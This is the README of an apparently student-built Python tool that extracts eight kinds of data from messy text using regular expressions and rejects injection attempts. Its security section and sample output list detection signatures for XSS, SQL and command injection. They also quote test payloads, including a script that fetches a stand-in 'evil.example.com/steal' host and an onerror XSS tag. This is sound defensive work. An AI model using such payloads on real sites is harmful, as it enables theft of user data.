# ALU Regex Data Extraction

A small, defensive data-extraction tool. It reads unstructured text — support
tickets, chat logs, scraped HTML, invoices — and pulls out **eight** kinds of
structured data with regular expressions, validating and sanitising every
candidate before it is allowed into the output.

The guiding idea: **a regex tells you something *looks* right; it does not tell
you it *is* right, and it certainly does not tell you it is *safe*.** So every
match passes through three gates — a security gate, a validation gate, and a
sanitisation gate — before it appears in the results.

---

## Data types extracted

| # | Type | Examples matched |
|---|------|------------------|
| 1 | **Email addresses** | `user@example.com`, `first.last+tag@sub.domain.example.co.uk` |
| 2 | **URLs** | `https://example.com`, `http://host.example.net:8080/path?q=1#frag` |
| 3 | **Phone numbers** | `(555) 123-4567`, `555-123-4567`, `555.246.8100`, `+250 788 123 456` |
| 4 | **Credit card numbers** | `4111 1111 1111 1111`, `5500-0000-0000-0004`, Amex `3782 822463 10005` |
| 5 | **Times** | `14:30`, `23:59:59`, `2:30 PM`, `7:30 a.m.` |
| 6 | **HTML tags** | `<p>`, `<div class="x">`, `</span>`, `<img src="..." />`, `<br>` |
| 7 | **Hashtags** | `#DataEngineering`, `#alu_regex`, `#100DaysOfCode` |
| 8 | **Currency amounts** | `$1,299.00`, `EUR 25,00`, `150,000 RWF`, `£2,450.75`, `¥12,000` |

---

## Quick start

```bash
git clone https://github.com/63DON/alu-regex-data-extraction_63DON.git
cd alu-regex-data-extraction_63DON

python3 src/main.py                       # reads input/raw-text.txt
                                          # writes output/sample-output.json
```

Options:

```bash
python3 src/main.py -i path/to/text.txt -o path/to/result.json
python3 src/main.py --no-mask             # show emails/phones in full
                                          # (card numbers stay masked, always)
```

Run the tests:

```bash
cd src && python3 test_main.py            # 28 tests, no dependencies
```

Requires **Python 3.9+**. No third-party packages.

---

## Project structure

```
alu-regex-data-extraction_63DON/
├── input/
│   └── raw-text.txt          # realistic messy sample: tickets, chat, HTML,
│                             # malformed data, and injection payloads
├── src/
│   ├── main.py               # patterns, validators, sanitisers, CLI
│   └── test_main.py          # 28 unit tests covering every type + security
├── output/
│   └── sample-output.json    # generated report (data + rejects + counts)
└── README.md
```

---

## How it works

Each match travels through a short pipeline:

```
raw text
   │
   ├─▶ size / line-length guard        (reject oversized or hostile input up front)
   │
   ├─▶ regex match                     (static, bounded patterns only)
   │
   ├─▶ security gate                   (injection signatures — on the match AND
   │                                     on the line it came from)
   │
   ├─▶ validation gate                 (Luhn, TLD, E.164 digit count, scheme
   │                                     allow-list, length caps …)
   │
   ├─▶ de-duplication                  (phones/cards compared by digits, so
   │                                     555-1234 == 555.1234)
   │
   └─▶ sanitisation                    (mask cards always; mask emails/phones
                                         unless --no-mask)
```

### The patterns, briefly

Every pattern lives in the `PATTERNS` dict in `src/main.py`, each with a comment
explaining its parts. A few of the more interesting decisions:

**Email** — the TLD is forced to be alphabetic (`[A-Za-z]{2,24}`), which is what
rejects `user@localhost`. A left guard `(?<![\w.+-])` stops the pattern starting
mid-word, and the local part is capped at the RFC's 64 characters.

**URL** — the scheme is pinned to `https?` in the regex *and* re-checked in the
validator. That redundancy is deliberate: `javascript:`, `data:`, `file:` and
`ftp:` are the three or four schemes that turn "extracted a link" into a security
incident, so they are blocked twice. Trailing sentence punctuation is stripped,
so `See https://example.com/docs.` yields the URL without the full stop.

**Phone** — three explicit alternatives instead of one greedy pattern. A single
loose pattern happily "finds" a phone number inside `1234567890123456789`;
explicit shapes do not.

**Credit card** — the regex only finds the *shape*. Validity is decided by the
**Luhn checksum**, which is why `1234 5678 9012 3456` is rejected while
`4111 1111 1111 1111` is accepted, and why the issuer (Visa / Mastercard / Amex /
Discover) can be reported from the leading digits.

**Time** — the valid ranges are encoded in the pattern itself
(`(?:[01]\d|2[0-3]):[0-5]\d`), so `25:99` and `19:61` never match at all rather
than being caught later.

**Hashtag** — must start with a letter or underscore, with lookaheads that
exclude hex colours. This is what keeps `#ffffff` and `#12345` out of the results
— the two false positives almost every naive hashtag regex produces.

**Currency** — handles symbol-prefix (`$1,299.00`), code-prefix (`USD 3,500.50`)
and code-suffix (`150,000 RWF`) forms, and both `1,299.00` and European `25,00`
decimal styles.

---

## Security

The security rubric is treated as a first-class feature, not an afterthought.

**1. Injection payloads are quarantined, not extracted.**
Twelve signature groups cover XSS (`<script>`, `<iframe>`, `onerror=`,
`javascript:`, `data:` URIs), SQL injection (tautologies, `UNION SELECT`,
`DROP TABLE`, comment terminators), command injection (`` ` ``, `$(...)`,
`| sh`), template injection (`{{...}}`, `${jndi:...}`), path traversal (`../`)
and null bytes.

**2. Context-aware rejection.**
A candidate is judged by its surroundings as well as itself. `https://evil.example.com/steal`
is a perfectly well-formed URL — but when it appears inside
`<script>fetch('https://evil.example.com/steal')</script>` it is refused, with
the reason `injection_context:xss_script_tag`. Clean-looking data in a hostile
context is still hostile data.

**3. Sensitive data never leaves in the clear.**
Card numbers are masked to `**** **** **** 1111` *before* they are stored, so a
full PAN is never written to the JSON, never logged and never held in the result
object. Emails and phones are masked by default and require an explicit
`--no-mask` to reveal.

**4. ReDoS-safe by construction.**
Every quantifier is bounded (`{0,300}`, never `*` or `+` on a nested group), so
no crafted input can trigger catastrophic backtracking. Input is capped at 2 MB,
individual lines are truncated at 5,000 characters, and each type stops after 500
matches. A test feeds the classic `"a"*5000 + "@" + "b"*5000` probe through every
pattern to prove they terminate.

**5. No dynamic code, ever.**
All patterns are static module-level constants. User input is never compiled into
a regex and never passed to `eval`, `exec` or a shell — which removes regex
injection and command injection as a class rather than defending against them
case by case.

**6. Failures are visible, not silent.**
Everything rejected is reported in the `rejected` array with a machine-readable
reason (`failed_luhn_checksum`, `scheme_not_allowed`, `consecutive_dots`,
`injection:xss_event_handler`, …). Dropping bad data quietly is how bugs hide.

---

## Sample output

Abridged from `output/sample-output.json`:

```json
{
  "metadata": {
    "source_file": "raw-text.txt",
    "masking_enabled": true,
    "total_valid_matches": 60,
    "total_rejected": 13
  },
  "counts": {
    "email_addresses": 7,
    "urls": 6,
    "phone_numbers": 5,
    "credit_card_numbers": 3,
    "times": 10,
    "html_tags": 14,
    "hashtags": 8,
    "currency_amounts": 7
  },
  "data": {
    "email_addresses": ["a*********e@alueducation.com", "b*****g@example.com"],
    "urls": ["https://shop.example.com/account/billing?plan=pro&ref=email"],
    "credit_card_numbers": [
      { "masked": "**** **** **** 1111", "brand": "Visa", "length": 16, "luhn_valid": true }
    ],
    "hashtags": ["#urgent", "#Payments2026", "#alu_regex"]
  },
  "rejected": [
    { "type": "credit_card_numbers", "value": "1234 5678 9012 3456", "reason": "failed_luhn_checksum" },
    { "type": "urls", "value": "https://evil.example.com/steal?c=", "reason": "injection_context:xss_script_tag" },
    { "type": "html_tags", "value": "<img src=x onerror=\"alert('xss')\">", "reason": "injection:xss_event_handler" }
  ]
}
```

---

## Edge cases handled

| Input | Result |
|---|---|
| `user@localhost` | rejected — no public TLD |
| `double..dots@example.com` | rejected — consecutive dots |
| `ftp://files.example.com/dump.zip` | rejected — scheme not allowed |
| `https://user:pass@example.com` | rejected — credentials in URL |
| `See https://example.com/docs.` | trailing full stop stripped |
| `1234 5678 9012 3456` | rejected — fails Luhn |
| `4111-1111-1111` | rejected — wrong length |
| `25:99`, `19:61`, `7:60 PM` | never matched |
| `#ffffff`, `#12345` | not hashtags |
| `<!-- retry window 15:00 -->` | HTML comment, *not* flagged as SQL |
| `+250 788 123 456` and `+250-788-123-456` | de-duplicated to one entry |
| `1234567890123456789` | not a phone number |

---

## Testing

`src/test_main.py` contains 28 tests across eight test classes — one per data
type plus a dedicated `TestSecurity` class covering XSS quarantine, SQL
signatures, context-aware rejection, the HTML-comment false positive, PAN
masking, and ReDoS termination.

```
$ cd src && python3 test_main.py
...
Ran 28 tests in 0.005s

OK
```
